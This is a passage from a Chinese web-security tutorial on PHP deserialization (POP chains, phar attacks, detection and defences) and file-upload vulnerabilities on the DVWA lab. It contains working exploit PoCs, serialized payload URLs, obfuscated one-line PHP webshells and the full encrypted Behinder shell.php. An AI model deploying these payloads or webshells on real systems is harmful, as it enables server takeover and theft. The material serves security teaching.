下面是 PHP 中一些常用的魔术方法：
</p>

<div class="org-src-container">
<pre class="src src-lang-php">__construct()   #类的构造函数
__destruct()    #类的析构函数
__call()        #在对象中调用一个不可访问方法时调用
__callStatic()  #用静态方式中调用一个不可访问方法时调用
__get()    #获得一个类的成员变量时调用
__set()    #设置一个类的成员变量时调用
__isset()  #当对不可访问属性调用isset()或empty()时调用
__unset()  #当对不可访问属性调用unset()时被调用。
__sleep()  #执行serialize()时，先会调用这个函数
__wakeup() #执行unserialize()时，先会调用这个函数
__toString()   #类被当成字符串时的回应方法
__invoke()     #调用函数的方式调用一个对象时的回应方法
__set_state()  #调用var_export()导出类时，此静态方法会被调用。
__clone()      #当对象复制完成时调用
__autoload()   #尝试加载未定义的类
__debugInfo()  #打印所需调试信息
</pre>
</div>

<p>
下面通过一段漏洞代码来演示下魔术方法在反序列化漏洞中的利用，vul.php漏
洞代码如下：
</p>

<div class="org-src-container">
<pre class="src src-lang-php">&lt;?php
  class People {
    private $type;

    function __construct(){
      $this-&gt;type = new Student();
    }

    function __destruct() {
      $this-&gt;type-&gt;run();
    }
  }

  class Student {
    function run() {
      echo "he is a student.";
    }
  }

  class Evil {
    var $cmd;
    function run() {
      system($this-&gt;cmd);
    }
  }

  unserialize($_GET['str']);  // 漏洞触发点，引用外部可控参数作为反序列化数据
?&gt;
</pre>
</div>

<p>
先分析下代码，$_GET['str'] 获取 get 参数 str 值，然后传递给
unserialize进行反序列化操作，这就是导致漏洞的地方。
</p>

<p>
那么我们该如何利用呢？审查整份代码，发现 Evil 类中的命令执行方法run()，
如果能控制其中的 $cmd 变量就可以实现远程命令执行。在 People 类
的__construct 方法中有属性赋值操作，将 Student 对象赋值给 $type 属性。
</p>

<p>
同时，在 __destruct 方法中有调用 run()方法的操作，因此我们可以设法此这
些操作关联起来，写出利用代码去生成用来实现命令执行的序列化字符串。
</p>

<p>
poc.php 利用代码如下：
</p>

<div class="org-src-container">
<pre class="src src-lang-php">&lt;?php
  class People {
    private $type;

    function __construct(){
      $this-&gt;type = new Evil();
    }
  }
  class Evil {
    var $cmd = 'id';
  }
  $people = new People();
  $str = serialize($people);
  echo $str;
?&gt;
</pre>
</div>

<p>
运行生成序列化字符串：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">$ php poc.php
O:6:"People":1:{s:12:"Peopletype";O:4:"Evil":1:{s:3:"cmd";s:2:"id";}}
</pre>
</div>

<p>
里面的 "Peopletype" 又被吃掉 \x00 了，得补回去，然后将上述字符串作为
get参数 $str 的值发送给 vul.php：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">http://127.0.0.1/vul.php?str=O:6:%22People%22:1:{s:12:%22%00People%00type%22;O:4:%22Evil%22:1:{s:3:%22cmd%22;s:2:%22id%22;}}
</pre>
</div>


<figure id="org16f5dfb">
<img src="./images/Ciqc1GAJUtSAOq4oAAFC9pGx2M8332.png" alt="Ciqc1GAJUtSAOq4oAAFC9pGx2M8332.png" width="80%">

</figure>

<p>
图 1 成功利用反序列化漏洞执行任意命令
</p>

<p>
总结下利用思路：
</p>

<ol class="org-ol">
<li>寻找原程序中可利用的目标方法，比如包含 system、eval、exec等危险函数
的地方，正如示例中的 Evil 类；</li>

<li>追踪调用第 1 步中方法的其他类方法/函数，正如示例中 People 类方
法__destruct()；</li>

<li>寻找可控制第 1 步方法的参数的其他类方法函数，正如示例中 People 类方
法__construct()；</li>

<li>编写 poc，构建恶意类对象，然后调用 serialize 函数去生成序列化字符串；</li>

<li>将生成的序列化字符串传递给漏洞参数实现利用。</li>
</ol>
</div>
</div>
<div id="outline-container-pop-链构造" class="outline-4">
<h4 id="pop-链构造">2.POP 链构造</h4>
<div class="outline-text-4" id="text-pop-链构造">
<p>
面向属性编程（Property-Oriented Programing，POP）利用现有执行环境中原
有的代码序列（比如原程序中已定义或者可动态加载的对象属性、方法），将这
些调用组合在一起形式特定的调用链，以达到特定目的的方法。这与二进制漏洞
利用中的ROP（Return-Oriented Progaming，面向返回编程）的原理是相似的。
</p>

<p>
其实前面利用魔术方法构建调用链的方法就算是 POP 链，只是比较简单，在真实
的漏洞环境中，会复杂很多。
</p>

<p>
我从网上找了一道 CTF 题，以帮助你更好地理解构建 POP 链的思路。
</p>

<p>
题目代码如下，代码中有 3 个类，Output 类有构造方法 construct 和析构方
法destruct，Show 类中有一些设置属性值的方法，Test类中则含有读取文件的
方法，最后使用 GET 参数传入 unserialize()函数导致反序列化漏洞。
</p>

<pre class="example" id="org6ac8de6">
&lt;?php
class Output{
    public $test;
    public $str;
    public function __construct($name){
        $this-&gt;str = $name;
    }
    public function __destruct(){
        $this-&gt;test = $this-&gt;str;
        echo $this-&gt;test;
    }
}
class Show{
    public $source;
    public $str;
    public function __construct($file){
        $this-&gt;source = $file;
        echo $this-&gt;source;
    }
    public function __toString(){
        $content = $this-&gt;str['str']-&gt;source;
        return $content;
    }
    public function __set($key,$value){
        $this-&gt;$key = $value;
    }
    public function _show(){
        if(preg_match('/http|https|file:|gopher|dict|\.\.|f1ag/i',$this-&gt;source)){
            die('hacker!');
        } else {
            highlight_file($this-&gt;source);
        }
    }
    public function __wakeup(){
        if(preg_match("/http|https|file:|gopher|dict|\.\./i", $this-&gt;source)){
            echo "hacker~";
            $this-&gt;source = "index.php";
        }
    }
}
class Test{
    public $file;
    public $params;
    public function __construct(){
        $this-&gt;params = array();
    }
    public function __get($key){
        return $this-&gt;get($key);
    }
    public function get($key){
        if(isset($this-&gt;params[$key])){
            $value = $this-&gt;params[$key];
        } else {
            $value = "index.php";
        }
        return $this-&gt;file_get($value);
    }
    public function file_get($value){
        $text = base64_encode(file_get_contents($value));
        return $text;
    }
}
show_source(__FILE__);
$name=unserialize($_GET['strs']);
?&gt;
</pre>

<p>
按照前面介绍的利用思路，一步步来套用上。
</p>

<p>
<b>1. 寻找原程序中可利用的目标方法，比如包含 system、eval、exec等危险函
数的地方。</b>
</p>

<p>
在题目中，没有找到上面用于执行代码或命令的函数，但是在Test::file_get()
调用 file_get_contents读取文件内容，如果能够利用它实现任意文件读取也是
可取的，因此就以 Test类方法 file_get 为目标方法；
</p>

<p>
<b>2. 追踪调用第 1 步中方法的其他类方法/函数。</b>
</p>

<p>
看哪里调用 Test::file_get()，可以看到是Test::get()，再往上追踪，发现是
在 Test::__get() 调用的，这个 __get()魔术方法的触发条件是：读取不可访
问属性值，包括私有或未定义属性。在Show::__toString() 中就有对未定义属
性 $content 的操作，这样就会触发__get() 方法。再往上追溯，发现
Output::__destruct() 中调用到 echo函数可触发 __toString() ，这样就得到
整个调用链如下：
</p>


<figure id="org78a96a1">
<img src="./images/CgqCHmAJUuyAZXQKAAB855K4LBk536.png" alt="CgqCHmAJUuyAZXQKAAB855K4LBk536.png" width="80%">

</figure>

<p>
图 2 调用链
</p>

<p>
<b>3. 寻找可控制第 1 步方法的参数的其他类方法函数。</b>
</p>

<p>
这里需要控制的是 file_get_contents($value) 中的参数$value，依次往上追
溯，发现其来自数组中的一个元素值，得到如下传播路径：
</p>


<figure id="org0d51f52">
<img src="./images/Ciqc1GAJUvSAaqlFAAB9jR92PEM612.png" alt="Ciqc1GAJUvSAaqlFAAB9jR92PEM612.png" width="80%">

</figure>

<p>
图 3 参数传播路径
</p>

<p>
为了对应 Show::__toString() 中的 $this-&gt;str['str']-&gt;source
，我们可以通过array('source'=&gt;'可控内容') 来控制
$value，即打算读取的文件路径。进一步优化下传播路径：
</p>


<figure id="org045e472">
<img src="./images/Ciqc1GAJUvuASTMYAAB-HQ644z0682.png" alt="Ciqc1GAJUvuASTMYAAB-HQ644z0682.png" width="80%">

</figure>

<p>
图 4 优化后的参数传播路径
</p>

<p>
<b>4. 编写 poc，构建恶意类对象，然后调用 serialize 函数去生成序列化字符串。</b>
</p>

<p>
根据图 2 的调用链可以知道，起始的调用类在Output，因此我们需要反序列化
它。
</p>

<p>
基于前面的分析，PoC 代码如下：
</p>
<div class="org-src-container">
<pre class="src src-sh">&lt;?php
  class Output{
    public $<span style="color: #a0522d;">test</span>;
    public $<span style="color: #a0522d;">str</span>;
    public <span style="color: #a020f0;">function</span> <span style="color: #0000ff;">__construct</span>($<span style="color: #a0522d;">name</span>){
          $<span style="color: #a0522d;">this</span>-&gt;str = $<span style="color: #a0522d;">name</span>;
      }
      public <span style="color: #a020f0;">function</span> <span style="color: #0000ff;">__destruct</span>(){
          $<span style="color: #a0522d;">this</span>-&gt;test = $<span style="color: #a0522d;">this</span>-&gt;str;
          <span style="color: #483d8b;">echo</span> $<span style="color: #a0522d;">this</span>-&gt;test;
      }
  }
  class Show{
    public $<span style="color: #a0522d;">str</span>;
    public $<span style="color: #a0522d;">source</span>;
    public <span style="color: #a020f0;">function</span> <span style="color: #0000ff;">__toString</span>(){
          $<span style="color: #a0522d;">content</span> = $<span style="color: #a0522d;">this</span>-&gt;str[<span style="color: #8b2252;">'str'</span>]-&gt;source;
          <span style="color: #a020f0;">return</span> (string)$<span style="color: #a0522d;">content</span>;
      }
  }
  class Test{
    public $<span style="color: #a0522d;">file</span>;
    public $<span style="color: #a0522d;">params</span>;
    // &#21407;&#26041;&#27861;&#30340;&#23450;&#20041;&#27492;&#22788;&#30465;&#30053;&#65292;&#22240;&#20026;&#23427;&#23545;&#29983;&#25104;&#24207;&#21015;&#21270;&#23383;&#31526;&#20018;&#27809;&#26377;&#24433;&#21709;
  }
  $<span style="color: #a0522d;">test</span> = new Test();
  $<span style="color: #a0522d;">test</span>-&gt;params = array(<span style="color: #8b2252;">'source'</span>=&gt;<span style="color: #8b2252;">'/var/www/html/flag.php'</span>);
  $<span style="color: #a0522d;">show</span> = new Show();
  $<span style="color: #a0522d;">show</span>-&gt;str = array(<span style="color: #8b2252;">'str'</span>=&gt;$<span style="color: #a0522d;">test</span>);
  $<span style="color: #a0522d;">output</span> = new Output($<span style="color: #a0522d;">show</span>);
  <span style="color: #483d8b;">echo</span> serialize($<span style="color: #a0522d;">output</span>);
?&gt;
</pre>
</div>

<p>
执行后得到如下序列化字符串：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">O:6:"Output":2:{s:4:"test";N;s:3:"str";O:4:"Show":2:{s:3:"str";a:1:{s:3:"str";O:4:"Test":2:{s:4:"file";N;s:6:"params";a:1:{s:6:"source";s:22:"/var/www/html/flag.php";}}}s:6:"source";N;}}
</pre>
</div>

<p>
<b>5. 将生成的序列化字符串传递给漏洞参数实现利用</b>
</p>

<p>
漏洞参数是 GET 参数 str，因此可以如此构造请求：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">http://127.0.0.1/vul.php?str=O:6:"Output":2:{s:4:"test";N;s:3:"str";O:4:"Show":2:{s:3:"str";a:1:{s:3:"str";O:4:"Test":2:{s:4:"file";N;s:6:"params";a:1:{s:6:"source";s:22:"/var/www/html/flag.php";}}}s:6:"source";N;}}
</pre>
</div>

<p>
整个过程可能有点绕，但 POP链的利用技术就是如此，需要你对目标程序进行全
方位的分析，提取出可利用的调用链进行组装，才有可能实现真正的攻击效果。
</p>
</div>
</div>
<div id="outline-container-phar-文件攻击" class="outline-4">
<h4 id="phar-文件攻击">3.phar 文件攻击</h4>
<div class="outline-text-4" id="text-phar-文件攻击">
<p>
在 2018 年 BlackHat 黑客大会上，安全研究员 Sam Thomas 分享了议题“It's
a PHP unserialization vulnerability Jim, but not as we know it”，介绍
了一种关于利用 phar 文件实现反序列化漏洞的利用技巧，利用的是phar 文件
中序列化存储用户自定义的meta-data，在解析该数据时就必然需要反序列化，
配合 phar://伪协议即可触发对此的反序列化操作。比如如下代码即可触发对
test.txt文件内容的反序列化操作：
</p>

<div class="org-src-container">
<pre class="src src-lang-php">$filename = 'phar://phar.phar/test.txt';
file_get_contents($filename);
</pre>
</div>

<p>
在实际利用时，还可以对 phar文件进行格式上的伪造，比如添加图片的头信息，
将其伪装成其他格式的文件，用于绕过一些上传文件格式的限制。
</p>

<p>
更加具体技术资料，推荐以下两篇：
</p>

<p>
<a href="https://paper.seebug.org/680/">《利用 phar 拓展 php反序列化漏洞攻击面》</a>
</p>

<p>
<a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf">《It's a PHP unserialization vulnerability Jim, but not as we know it》</a>
</p>
</div>
</div>
</div>
<div id="outline-container-如何挖掘反序列化漏洞" class="outline-3">
<h3 id="如何挖掘反序列化漏洞">如何挖掘反序列化漏洞？</h3>
<div class="outline-text-3" id="text-如何挖掘反序列化漏洞">
</div>
<div id="outline-container-代码审计" class="outline-4">
<h4 id="代码审计">1.代码审计</h4>
<div class="outline-text-4" id="text-代码审计">
<p>
个人认为，想主动检测一些反序列化漏洞，特别是 0day漏洞，最好的方法就是
代码审计，针对不同的语言的反序化操作函数，比如 php unserialize 函数，
还要注意 phar文件攻击场景，然后往上回溯参数的传递来源，看是否有外部可
控数据引用（比如GET、POST 参数等等），而又未过任何过滤，那么它就有可能
存在反序列化漏洞。
</p>
</div>
</div>
<div id="outline-container-rasp-检测" class="outline-4">
<h4 id="rasp-检测">2.RASP 检测</h4>
<div class="outline-text-4" id="text-rasp-检测">
<p>
在《08 | SQL 注入：漏洞的检测与防御》中已经介绍过RASP，可以针对不同的
语言做一些 Hook，如果发现一些敏感函数（比如 php eval、unserialize）被
执行就打印出栈回溯，方便追踪漏洞成功，以及漏洞利用技术技巧，整个POP 链
也可以从中获取到。
</p>

<p>
所以，通过 RASP 不仅有利于拦截漏洞攻击，还可以定位漏洞代码，以及学习攻
击者的利用技术，为后续的漏洞修复和拦截提供更多的参考价值。
</p>
</div>
</div>
<div id="outline-container-动态黑盒扫描" class="outline-4">
<h4 id="动态黑盒扫描">3.动态黑盒扫描</h4>
<div class="outline-text-4" id="text-动态黑盒扫描">
<p>
通过收集历史漏洞的payload，再结合网站指纹识别，特别是第三方库的识别，
然后再根据不同的第三方库发送对应的payload，根据返回结果作漏洞是否存在
的判断。
</p>

<p>
这项工作也常于外曝漏洞后的安全应急工作，然后加入日常漏洞扫描流程中，以应对新增业务的检测。
</p>
</div>
</div>
</div>
<div id="outline-container-防御反序列化漏洞" class="outline-3">
<h3 id="防御反序列化漏洞">防御反序列化漏洞</h3>
<div class="outline-text-3" id="text-防御反序列化漏洞">
<ul class="org-ul">
<li><b>黑白名单限制</b></li>
</ul>

<p>
针对反序列化的类做一份白名单或黑名单的限制，首选白名单，避免一些遗漏问
题被绕过。这种方法是当前很多主流框架的修复方案。
</p>

<p>
黑名单并不能完全保证序列化过程的安全，有时网站开发个新功能，加了一些类
之后，就有可能绕过黑名单实现利用，这也是为什么有些反序列化漏洞修复后又
在同一个地方出现的原因。
</p>

<ul class="org-ul">
<li><b>WAF</b></li>
</ul>

<p>
收集各种语言的反序列化攻击数据，提取特征用于拦截请求。
</p>

<ul class="org-ul">
<li><b>RASP</b></li>
</ul>

<p>
RASP 除了可以检测漏洞外，它本身也可以提供类似 WAF 的防御功能。
</p>
</div>
</div>
<div id="outline-container-扩展其他语言的反序列化" class="outline-3">
<h3 id="扩展其他语言的反序列化">扩展：其他语言的反序列化</h3>
<div class="outline-text-3" id="text-扩展其他语言的反序列化">
<p>
其他编程语言也存在对应的序列化和反序列化功能，其产生和利用的原理与 PHP
类似。
</p>

<ul class="org-ul">
<li><b>Python</b></li>
</ul>

<p>
使用模块 pickle 就可以实现对一个 Python 对象结构的二进制序列化和反序列化
</p>

<div class="org-src-container">
<pre class="src src-lang-python"># 序列化
pickle.dump(obj, file, protocol=None, *, fix_imports=True) 
# 反序列化
pickle.load(file, *, fix_imports=True, encoding='ASCII', errors='strict')
</pre>
</div>

<ul class="org-ul">
<li><b>Java</b></li>
</ul>

<p>
在 Java 中，只要一个类实现了 java.io.Serializable接口，那么它就可以被
序列化，通过 ObjectOutputStream 和 ObjectInputStream来实现序列化与反序
列化操作。
</p>

<div class="org-src-container">
<pre class="src src-lang-java">// 序列化
ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(new File("d:/string.txt")));
oos.writeObject(obj) // 将对象序列化后的字符串写入d:/string.txt
// 反序列化
ObjectInputStream ois = new ObjectInputStream(new FileInputStream(new File("d:/string.txt")));
ois.readObject();  // 读取d:/string.txt中的序列化字符串，并重建回对象
</pre>
</div>

<ul class="org-ul">
<li><b>Ruby</b></li>
</ul>

<p>
在 Ruby 中可以使用 Marshal 模块实现对象的序列化与反序列化操作。
</p>

<div class="org-src-container">
<pre class="src src-lang-ruby"># 序列化
str = Marshal.dump(obj)
#反序列化
obj = Marshal.load(str)
</pre>
</div>
</div>
</div>
<div id="outline-container-小结" class="outline-3">
<h3 id="小结">小结</h3>
<div class="outline-text-3" id="text-小结">
<p>
本节课主要介绍 PHP 下反序列化漏洞，专门举几个代码 demo 进行演示，让你对
序列化与反序列化有个实际的直观感受，然后构造漏洞demo，讲解针对反序列化
漏洞的利用思路，旨在帮助你加深 POP链与魔术方法利用技巧，这在反序列化漏
洞利用中是最为常用的。
</p>

<p>
其他语言也有反序列化漏洞，比如 Java语言，大家可以在留言区中评论，探讨
其他语言的一些反序列化漏洞。
</p>
</div>
</div>
</section>
<section id="outline-container-文件上传漏洞：种植服务器木马的捷径" class="outline-2">
<h2 id="文件上传漏洞：种植服务器木马的捷径">文件上传漏洞：种植服务器木马的捷径</h2>
<div class="outline-text-2" id="text-文件上传漏洞：种植服务器木马的捷径">
<p>
上一讲介绍过反序列化漏洞，利用漏洞常可以造成执行代码的严重后果。
</p>

<p>
从本讲开始将介绍文件上传漏洞，它比反序列化漏洞原理与利用更加简单，但同
样可以达到控制服务器的严重后果，不少攻击者会通过此类漏洞向服务器种植木
马，以获取服务器的控制权限。
</p>

<p>
下面我们就详细介绍下文件上传漏洞的原理、利用方法、绕过限制、检测与防御。
</p>
</div>
<div id="outline-container-漏洞成因" class="outline-3">
<h3 id="漏洞成因">漏洞成因</h3>
<div class="outline-text-3" id="text-漏洞成因">
<p>
文件上传漏洞正是在文件上传功能中，由于对用户上传的文件数据未做有效检测
或过滤不严，导致上传的恶意文件被服务端解释器解析执行，利用漏洞可获取系
统控制权。
</p>

<p>
很多网站都有一些文件上传功能，常见的是图片、视频、压缩文档上传，如果网
站是PHP 写的，那么上传 PHP到服务器就有可能被解析，若服务器支持其他语言
的解析执行，比如ASP、JSP、ASPX 等文件也可达到同等攻击效果，达到恶意代
码执行。
</p>

<p>
以 DVWA 靶场的文件上传漏洞为例：
</p>


<figure id="orga0ff61f">
<img src="./images/Cip5yGAOpPiAMkOEAAVBpkJSo30732.png" alt="Cip5yGAOpPiAMkOEAAVBpkJSo30732.png" width="80%">

</figure>

<p>
图 1 DVWA File Upload
</p>

<p>
对应的漏洞代码如下，通过 POST 请求将文件上传到“网站根目录
/hackable/uploads/”目录：
</p>

<div class="org-src-container">
<pre class="src src-sh">&lt;?php
<span style="color: #a020f0;">if</span>( isset( $<span style="color: #a0522d;">_POST</span>[ <span style="color: #8b2252;">'Upload'</span> ] ) ) {
    // Where are we going to be writing to?
    $<span style="color: #a0522d;">target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span style="color: #8b2252;">"hackable/uploads/"</span>;
    $<span style="color: #a0522d;">target_path</span> .= basename( $<span style="color: #a0522d;">_FILES</span>[ <span style="color: #8b2252;">'uploaded'</span> ][ <span style="color: #8b2252;">'name'</span> ] );
    // Can we move the file to the upload folder?
    <span style="color: #a020f0;">if</span>( !move_uploaded_file( $<span style="color: #a0522d;">_FILES</span>[ <span style="color: #8b2252;">'uploaded'</span> ][ <span style="color: #8b2252;">'tmp_name'</span> ], $<span style="color: #a0522d;">target_path</span> ) ) {
        // No
        <span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;
    }
    <span style="color: #a020f0;">else</span> {
        // Yes!
        <span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">"&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;"</span>;
    }
}
?&gt;
</pre>
</div>

<p>
中间没有任何限制，也就是说上传 PHP 文件也可以，简单写个包含 phpinfo() 的
php 文件：
</p>

<div class="org-src-container">
<pre class="src src-lang-php">&lt;?php phpinfo(); ?&gt;
</pre>
</div>

<p>
上传后有路径提示：
</p>


<figure id="orgc0b4c5d">
<img src="./images/Cip5yGAOpQyAZX8VAAIOqsWIghc896.png" alt="Cip5yGAOpQyAZX8VAAIOqsWIghc896.png" width="80%">

</figure>

<p>
图 2 上传 PHP 成功
</p>

<p>
访问地址：<a href="http://127.0.0.1/hackable/uploads/phpinfo.php">http://127.0.0.1/hackable/uploads/phpinfo.php</a>，可以看到
phpinfo() 已经被执行成功。
</p>


<figure id="org0785ed8">
<img src="./images/Ciqc1GAOpSaARCD_AALlCWvyDKc931.png" alt="Ciqc1GAOpSaARCD_AALlCWvyDKc931.png" width="80%">

</figure>

<p>
图 3 解析成功的 phpinfo
</p>

<p>
就如果我们上传的 PHP 是更多恶意功能的脚本，就可以实现更多攻击行为。
</p>
</div>
</div>
<div id="outline-container-利用漏洞上传-webshell" class="outline-3">
<h3 id="利用漏洞上传-webshell">利用漏洞上传 Webshell</h3>
<div class="outline-text-3" id="text-利用漏洞上传-webshell">
</div>
<div id="outline-container-一句话木马" class="outline-4">
<h4 id="一句话木马">1.一句话木马</h4>
<div class="outline-text-4" id="text-一句话木马">
<p>
提到 Webshell 木马，就不得不提下“一句话木马”。PHP 一句话木马可以通过
GET、POST、COOKIE这几种方式提交数据，然后将数据传递给代码/命令执行函数，
从而实现任意代码/命令执行。
</p>

<p>
比如以下这个一句话木马：
</p>

<div class="org-src-container">
<pre class="src src-lang-php">&lt;?php eval(@$_GET['a']); ?&gt;
</pre>
</div>

<p>
将上述代码保存为 eval.php 并上传至网站，然后构造请求：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">http://127.0.0.1/hackable/uploads/eval.php?a=phpinfo();
</pre>
</div>

<p>
利用一句话木马成功执行 phpinfo() 函数。
</p>


<figure id="org09f7902">
<img src="./images/CgqCHmAOpTmAfY3IAARME2KRqaY914.png" alt="CgqCHmAOpTmAfY3IAARME2KRqaY914.png" width="80%">

</figure>

<p>
图 4 利用一句话木马执行代码
</p>

<p>
有时为了绕过木马检测，攻击者会对一句话进行混淆变形，比如下面几句。
</p>

<ul class="org-ul">
<li><b>利用字符串拼接执行函数名：</b></li>
</ul>

<div class="org-src-container">
<pre class="src src-lang-php">&lt;?php
$a="e"."v";
$b="a"."l";
$c=$a.$b;
$c($_POST['a']);
?&gt;
</pre>
</div>

<ul class="org-ul">
<li><b>通过 base64_decode 编码执行函数名：</b></li>
</ul>

<div class="org-src-container">
<pre class="src src-lang-php">&lt;?php
$a=base64_decode("ZXZhbA==")
$a($_POST['a']);
?&gt;
</pre>
</div>

<ul class="org-ul">
<li><b>由 GET 参数指定函数名和参数：</b></li>
</ul>

<div class="org-src-container">
<pre class="src src-lang-php">&lt;?php $_GET['a']($_GET['b']);  ?&gt;
</pre>
</div>

<p>
行业内常称“一句话木马”为“小马”，用它来传递“大马”，因为“大马”比较容易被检测到。
</p>
</div>
</div>
<div id="outline-container-webshell-管理工具" class="outline-4">
<h4 id="webshell-管理工具">2.Webshell 管理工具</h4>
<div class="outline-text-4" id="text-webshell-管理工具">
<p>
攻击者常用“菜刀”“冰蝎”“蚁剑”、Weevely、Cknife 这些 Webshell工具
去连接一句话木马，其中尤以“菜刀”最为出名。
</p>

<p>
由于原版“菜刀”只支持Windows，因此我这边选用支持跨平台的“冰蝎”作为
演示，可进入<a href="https://github.com/rebeyond/Behinder/releases">Github</a>对“冰蝎”进行下载。
</p>

<p>
下载解压后的目录：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">$ tree
.
├── 更新日志.txt
├── Behinder_v3.0_Beta6_linux.jar
├── data.db
└── server
    ├── shell.asp
    ├── shell.aspx
    ├── shell.jsp
    ├── shell.jspx.jsp
    └── shell.php
</pre>
</div>

<p>
server 目录就是用来上传服务端的小马，我们选择上传shell.php，默认使用连
接密码 rebeyond，你可根据需要自行修改，然后用密码32 位 md5 哈希值替换
key 变量即可。
</p>

<p>
shell.php 代码如下：
</p>

<div class="org-src-container">
<pre class="src src-sh">&lt;?php
@error_reporting(0);
<span style="color: #0000ff;">session_start</span>();
    $<span style="color: #a0522d;">key</span>=<span style="color: #8b2252;">"e45e329feb5d925b"</span>; //&#35813;&#23494;&#38053;&#20026;&#36830;&#25509;&#23494;&#30721;32&#20301;md5&#20540;&#30340;&#21069;16&#20301;&#65292;&#40664;&#35748;&#36830;&#25509;&#23494;&#30721;rebeyond
        $<span style="color: #a0522d;">_SESSION</span>[<span style="color: #8b2252;">'k'</span>]=$<span style="color: #a0522d;">key</span>;
        $<span style="color: #a0522d;">post</span>=file_get_contents(<span style="color: #8b2252;">"php://input"</span>);  // &#35835;&#21462;&#19978;&#20256;&#25991;&#20214;&#20869;&#23481;
        <span style="color: #a020f0;">if</span>(!extension_loaded(<span style="color: #8b2252;">'openssl'</span>))
        {
                $<span style="color: #a0522d;">t</span>=<span style="color: #8b2252;">"base64_"</span>.<span style="color: #8b2252;">"decode"</span>;
                $<span style="color: #a0522d;">post</span>=$<span style="color: #a0522d;">t</span>($<span style="color: #a0522d;">post</span>.<span style="color: #8b2252;">""</span>);   // &#22914;&#26524;&#27809;&#26377;openssl&#25193;&#23637;&#23601;&#35843;&#29992;base64_decode

                <span style="color: #a020f0;">for</span>($<span style="color: #a0522d;">i</span>=0;$<span style="color: #a0522d;">i</span>&lt;strlen($<span style="color: #a0522d;">post</span>);$<span style="color: #a0522d;">i</span>++) {
                         $<span style="color: #a0522d;">post</span>[$<span style="color: #a0522d;">i</span>] = $<span style="color: #a0522d;">post</span>[$<span style="color: #a0522d;">i</span>]^$<span style="color: #a0522d;">key</span>[$<span style="color: #a0522d;">i</span>+1&amp;15]; 
                        }
        }
        <span style="color: #a020f0;">else</span>
        {
        // &#22914;&#26524;&#26377;openssl&#25193;&#23637;&#23601;&#37319;&#29992;AES128&#20301;&#35299;&#23494;&#65292;&#22240;&#20026;&#20912;&#34638;&#26159;&#21152;&#23494;&#20256;&#36755;&#30340;
                $<span style="color: #a0522d;">post</span>=openssl_decrypt($<span style="color: #a0522d;">post</span>, <span style="color: #8b2252;">"AES128"</span>, $<span style="color: #a0522d;">key</span>);
        }
    $<span style="color: #a0522d;">arr</span>=explode(<span style="color: #8b2252;">'|'</span>,$<span style="color: #a0522d;">post</span>);
    $<span style="color: #a0522d;">func</span>=$<span style="color: #a0522d;">arr</span>[0];
    $<span style="color: #a0522d;">params</span>=$<span style="color: #a0522d;">arr</span>[1];
        class C{public <span style="color: #a020f0;">function</span> <span style="color: #0000ff;">__invoke</span>($<span style="color: #a0522d;">p</span>) {<span style="color: #483d8b;">eval</span>($<span style="color: #a0522d;">p</span>.<span style="color: #8b2252;">""</span>);}}
    @call_user_func(new C(),$<span style="color: #a0522d;">params</span>);
?&gt;
</pre>
</div>

<p>
上传成功后得到地址：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">http://127.0.0.1/hackable/uploads/shell.php
</pre>
</div>

<p>
使用以下命令打开冰蝎客户端：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">java -jar Behinder_v3.0_Beta6_linux.jar
</pre>
</div>

<p>
右击菜单选择“新增”，把 shell.php 地址输入 URL，同时输入 shell.php中
的连接密码（此处我使用默认密码“rebeyond”），点击“保存”。
</p>


<figure id="org8525b1b">
<img src="./images/CgpVE2AOpVGASgILAAF0TN6o8cU323.png" alt="CgpVE2AOpVGASgILAAF0TN6o8cU323.png" width="80%">

</figure>

<p>
双击保存的 URL 去连接 shell.php，如果成功的话，会打开phpinfo，同时在右
上角显示“已连接”。
</p>


<figure id="orgd92e4d5">
<img src="./images/Ciqc1GAOpWeAOjNkAAIfIjLZ0Y0133.png" alt="Ciqc1GAOpWeAOjNkAAIfIjLZ0Y0133.png" width="80%">

</figure>

<p>
上面有很多附带功能，你可以管理服务器文件：
</p>


<figure id="org3d9253a">
<img src="./images/Cip5yGAOpYGAMOzZAAKQwoGuNvo092.png" alt="Cip5yGAOpYGAMOzZAAKQwoGuNvo092.png" width="80%">

</figure>

<p>
可以执行命令：
</p>


<figure id="orgc77d5d3">
<img src="./images/CgpVE2AOpZKAKj6EAAGxJFxWHbw029.png" alt="CgpVE2AOpZKAKj6EAAGxJFxWHbw029.png" width="80%">

</figure>

<p>
还有数据库管理、执行自定义代码以及内网穿透时常用的端口映射、Socks隧道
等等功能。
</p>

<p>
之前使用“菜刀”的人比较多，也导致不少网站增加了对其的检测规则，后来不
少人改用通信加密与设置连接密码的“冰蝎”，也有人基于此做了二次开发，做
一些检测特征清除，从而绕过一些安全系统的查杀。
</p>

<p>
<b>最后再提醒下，本文提及的相关工具仅限安全研究学习之用，请勿用于任何非法途径，否则后果自负。</b>
</p>
</div>
</div>
</div>
<div id="outline-container-绕过上传限制" class="outline-3">
<h3 id="绕过上传限制">绕过上传限制</h3>
<div class="outline-text-3" id="text-绕过上传限制">
</div>
<div id="outline-container-禁用-js" class="outline-4">
<h4 id="禁用-js">1.禁用 JS</h4>
<div class="outline-text-4" id="text-禁用-js">
<p>
很多时候，开发在限制上传文件格式时，仅是在前端 JS上做简单的文件后缀名
判断，若不是就中断处理。对于这种情况安装个 NoScript插件，禁用 JS 再上
传即可绕过。
</p>
</div>
</div>
<div id="outline-container-篡改数据包" class="outline-4">
<h4 id="篡改数据包">2.篡改数据包</h4>
<div class="outline-text-4" id="text-篡改数据包">
<p>
对于前端 JS 的限制，除了禁用 JS 外，我们还可以使用 curl、nc、BurpSuite
等工具构造数据包去发送请求，这样是不经过浏览器前端 JS的处理，从而绕过
